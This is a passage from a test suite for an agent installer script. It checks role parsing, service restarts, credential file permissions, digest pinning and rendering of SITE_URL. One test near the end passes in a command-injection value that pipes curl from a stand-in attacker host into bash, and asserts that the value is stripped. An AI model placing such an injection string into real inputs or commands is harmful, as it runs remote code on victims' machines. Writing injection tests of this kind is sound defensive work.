    const published = publishInfraAgent(sandbox, CURRENT);
    repin(sandbox, pinned(CURRENT, published.sha256));

    const result = run(sandbox, ["--role", "node", "--token", "plt_node_token", "--no-docker"]);
    expect(result.status).not.toBe(0);
    expect(result.stderr).toMatch(/Hub URL is required/);
    expect(existsSync(installedAgent(sandbox))).toBe(false);
  });

  it("refuses a role it does not serve", () => {
    const sandbox = createSandbox(CURRENT);
    const result = run(sandbox, ["--role", "gateway", "--token", "plt_node_token"]);
    expect(result.status).not.toBe(0);
    expect(result.stderr).toMatch(/Unknown --role: gateway/);
  });

  it("restarts the unit on a re-install, so what runs is what was just verified", () => {
    const sandbox = createSandbox(CURRENT);
    const published = publishInfraAgent(sandbox, CURRENT);
    repin(sandbox, pinned(CURRENT, published.sha256));
    grantRoot(sandbox);

    const first = run(sandbox, nodeArgs(), { connect: false });
    expect(first.status, `${first.stdout}\n${first.stderr}`).toBe(0);
    expect(first.stdout).toMatch(/systemd service 'portless-agent' is active/);

    const second = run(sandbox, nodeArgs(), { connect: false });
    expect(second.status, `${second.stdout}\n${second.stderr}`).toBe(0);

    // "enable --now" starts a stopped unit and does nothing to a running one, so without an
    // explicit restart the second install would leave the old process on the old bytes while
    // is-active reported success. Both installs restart; the restart follows the enable.
    const service = readLog(path.join(sandbox.root, "service.log")).trimEnd().split("\n");
    expect(service.filter((line) => line === "restart portless-agent")).toHaveLength(2);
    expect(service.indexOf("restart portless-agent")).toBeGreaterThan(
      service.indexOf("enable --now portless-agent"),
    );
  });

  it("writes the Hub credential to a file no other local user can read", () => {
    const sandbox = createSandbox(CURRENT);
    const published = publishInfraAgent(sandbox, CURRENT);
    repin(sandbox, pinned(CURRENT, published.sha256));
    grantRoot(sandbox);

    expect(run(sandbox, nodeArgs(), { connect: false }).status).toBe(0);

    // Created 0600 and then written, not created and chmodded afterwards: the second order leaves a
    // window in which any local user can read the Hub credential. The order is what is asserted,
    // because the end state is identical either way.
    const sudo = readLog(path.join(sandbox.root, "sudo.log")).trimEnd().split("\n");
    const restricted = sudo.findIndex((line) => line.includes("install -m 600"));
    const written = sudo.findIndex((line) => line === "tee /etc/portless/agent.env");
    expect(restricted, sudo.join(" / ")).toBeGreaterThanOrEqual(0);
    expect(restricted).toBeLessThan(written);

    const envFile = path.join(sandbox.sudoRoot, "etc", "portless", "agent.env");
    expect(statSync(envFile).mode & 0o077).toBe(0);
    expect(readFileSync(envFile, "utf8")).toMatch(/^PORTLESS_TOKEN=plt_node_token$/m);
    const unit = path.join(sandbox.sudoRoot, "etc", "systemd", "system", "portless-agent.service");
    expect(readFileSync(unit, "utf8")).toMatch(/^EnvironmentFile=\/etc\/portless\/agent\.env$/m);
    expect(readFileSync(unit, "utf8")).not.toMatch(/plt_node_token/);
  });
});

// The dispatch runs in front of both roles, so a bug in it is a bug on every install.
describe("--role parsing", () => {
  it("refuses a --role with no value, wherever the missing value falls", () => {
    for (const args of [["--role"], ["--token", "rcreg_test", "--role"]]) {
      const sandbox = createSandbox(CURRENT);
      const result = run(sandbox, args);

      // The second line is the one that was silently wrong rather than merely ugly: the dispatch
      // rotates every non---role argument to the back of "$@", so $# no longer counts what is left
      // to parse. Testing $# there took the rotated --token as the role name and handed the Worker
      // parser a bare rcreg_test — it rewrote the argument list instead of refusing.
      expect(result.status, args.join(" ")).toBe(1);
      expect(result.stderr, args.join(" ")).toMatch(/--role requires a value: worker or node/);
      expect(readLog(sandbox.npmLog), "nothing may be installed").toBe("");
    }
  });

  it("finds a --role that comes after the flags it rotates", () => {
    const sandbox = createSandbox(CURRENT);
    const published = publishRelease(sandbox, CURRENT, "new agent");
    repin(sandbox, { ...CURRENT, sha256: published.sha256 });
    publishRegistration(sandbox);

    const result = run(sandbox, [
      "--token",
      "rcreg_test",
      "--name",
      "test-machine",
      "--role",
      "worker",
    ]);
    expect(result.status, `${result.stdout}\n${result.stderr}`).toBe(0);
    // Rotation preserved the rest of the line, in a form the Worker parser accepts.
    expect(metaField(sandbox, "MACHINE_NAME")).toBe("test-machine");
  });
});

describe("--role worker", () => {
  // The regression that would matter most: the Worker path is what every existing machine installs
  // and updates with, and --role is new syntax in front of it.
  it("installs exactly as it does with no role given", () => {
    const sandbox = createSandbox(CURRENT);
    const published = publishRelease(sandbox, CURRENT, "new agent");
    repin(sandbox, { ...CURRENT, sha256: published.sha256 });
    publishRegistration(sandbox);

    const result = run(sandbox, [
      "--role",
      "worker",
      "--token",
      "rcreg_test",
      "--name",
      "test-machine",
    ]);
    expect(result.status, `${result.stdout}\n${result.stderr}`).toBe(0);
    expect(agentMarker(sandbox)).toBe("// new agent");
    expect(metaField(sandbox, "AGENT_VERSION")).toBe("1.4.2");
    expect(metaField(sandbox, "MACHINE_NAME")).toBe("test-machine");
  });

  it("is what the script does when no role is given at all", () => {
    const script = renderInstallScript(SITE_URL, AGENT_RELEASE);
    expect(script).toMatch(/^INSTALL_ROLE='worker'$/m);
  });

  // Everything from `SITE_URL=` down is the Worker installer as it was before /install served two
  // roles — 25 689 bytes, byte-identical to what main renders. The size is asserted because the
  // Node half above it would otherwise hide an edit to the Worker half in a large diff; a
  // deliberate change to the Worker path updates this number and says so.
  it("keeps the Worker installer contiguous, below the dispatch and unentangled with it", () => {
    const script = renderInstallScript(SITE_URL, AGENT_RELEASE);
    const workerBody = script.slice(script.indexOf("SITE_URL='"));
    expect(workerBody).toMatch(/^SITE_URL='https:\/\/example\.convex\.site'\nAGENT_REPO=/);
    expect(workerBody).not.toMatch(/INSTALL_ROLE|node_install|node_pinned_digest|--role/);
    expect(Buffer.byteLength(workerBody)).toBe(25_689);
  });
});

// Windows cannot run the bash installer, and a Node may well be a Windows box: deploy/infra/agent.ps1
// has been onboarding them with no integrity check at all. These assert the rendered script rather
// than run it — there is no PowerShell on the machine this suite runs on — so the end-to-end Windows
// proof is a separate, manual one.
describe("the PowerShell installer", () => {
  const WINDOWS_DIGEST = "b".repeat(64);
  const WINDOWS_PINNED: AgentRelease = {
    ...CURRENT,
    infraAgent: { "windows-x86_64": WINDOWS_DIGEST, "linux-x86_64": "c".repeat(64) },
  };

  it("carries the digest for the Windows target, and no other target's", () => {
    const script = renderPowerShellInstallScript(WINDOWS_PINNED);
    expect(script).toMatch(new RegExp(`"windows-x86_64" = "${WINDOWS_DIGEST}"`));
    expect(script).not.toMatch(/linux-x86_64/);
    expect(script).not.toMatch(/__[A-Z_]+__/);
  });

  it("compares what it downloaded against the pin before anything is installed", () => {
    const script = renderPowerShellInstallScript(WINDOWS_PINNED);
    const verify = script.indexOf("Get-FileHash");
    const install = script.indexOf("Move-Item");
    expect(verify).toBeGreaterThan(-1);
    expect(install).toBeGreaterThan(verify);
    expect(script).toMatch(/if \(\$actual -ne \$expected\) \{/);
    expect(script).toMatch(/Remove-Item -LiteralPath \$staged/);
    expect(script).toMatch(/Nothing was installed/);
    // Fail() exits non-zero; nothing in this script continues past a mismatch.
    expect(script).toMatch(/function Fail\(\$message\) \{\n[^}]*exit 1/);
  });

  it("verifies a -Source install with the same digest as a release install", () => {
    const script = renderPowerShellInstallScript(WINDOWS_PINNED);
    // One fetch, one hash, one comparison: -Source only decides which branch of the fetch runs.
    expect(script.match(/Get-FileHash/g)).toHaveLength(1);
    expect(script.match(/\$actual -ne \$expected/g)).toHaveLength(1);
    expect(script).toMatch(/if \(\$Source\) \{/);
  });

  it("refuses when this deployment pins nothing for Windows", () => {
    const script = renderPowerShellInstallScript(CURRENT);
    expect(script).toMatch(/\$pinned = @\{\n+\}/);
    expect(script).toMatch(/pins no Infra Agent build for \$target/);
  });

  it("keeps the identifiers a running Node already holds", () => {
    const script = renderPowerShellInstallScript(WINDOWS_PINNED);
    expect(script).toMatch(/Join-Path \$HOME "\.portless"/);
    expect(script).toMatch(/"portless-agent\.exe"/);
    expect(script).toMatch(/-TaskName "PortlessAgent"/);
  });

  it("serves only the Node role", () => {
    const script = renderPowerShellInstallScript(WINDOWS_PINNED);
    expect(script).toMatch(/\[string\]\$Role = "node"/);
    expect(script).toMatch(/if \(\$Role -ne "node"\) \{/);
  });
});

describe("Infra Agent asset names", () => {
  it("names the published asset for every target, with .exe only on Windows", () => {
    expect(INFRA_AGENT_TARGETS.map((target) => infraAgentAssetName(target))).toEqual([
      "infra-agent-linux-x86_64",
      "infra-agent-linux-arm64",
      "infra-agent-darwin-x86_64",
      "infra-agent-darwin-arm64",
      "infra-agent-windows-x86_64.exe",
    ]);
  });
});

// The installer bakes SITE_URL into the machine's agent config, so whatever
// lands here is what every registered runner will talk to from then on. The
// route feeds this from CONVEX_SITE_URL via resolveSiteUrl rather than from the
// request Host, so these two have to compose cleanly.
describe("rendered SITE_URL", () => {
  it("bakes the given origin in as the only SITE_URL", () => {
    const script = renderInstallScript("https://example.convex.site", AGENT_RELEASE);
    expect(siteUrlAssignments(script)).toEqual(["https://example.convex.site"]);
  });

  it("leaves no unsubstituted placeholder behind", () => {
    const script = renderInstallScript("https://example.convex.site", AGENT_RELEASE);
    expect(script.includes("__ERAINFRA_SITE_URL__")).toBe(false);
  });

  it("receives a bare origin from resolveSiteUrl, with no path or trailing slash", () => {
    const site = resolveSiteUrl("https://example.convex.site/nested/?a=1#b");
    expect(site.ok).toBe(true);

    const script = renderInstallScript(site.ok ? site.siteUrl : "", AGENT_RELEASE);
    expect(siteUrlAssignments(script)).toEqual(["https://example.convex.site"]);
    expect(script.includes("example.convex.site/")).toBe(false);
  });

  // SITE_URL is interpolated into a single-quoted shell string in a script the
  // operator pipes to bash, so a value carrying a quote would be command
  // injection. A resolveSiteUrl origin cannot: URL parsing confines it to
  // scheme, host and port, and anything that could hold a quote is dropped.
  it("cannot break out of the single-quoted shell assignment", () => {
    const site = resolveSiteUrl("https://example.convex.site/';curl evil.example|bash;'");
    expect(site.ok).toBe(true);
    expect(site.ok && site.siteUrl.includes("'")).toBe(false);

    const script = renderInstallScript(site.ok ? site.siteUrl : "", AGENT_RELEASE);
    expect(siteUrlAssignments(script)).toEqual(["https://example.convex.site"]);
    expect(script.includes("evil.example")).toBe(false);
  });
});
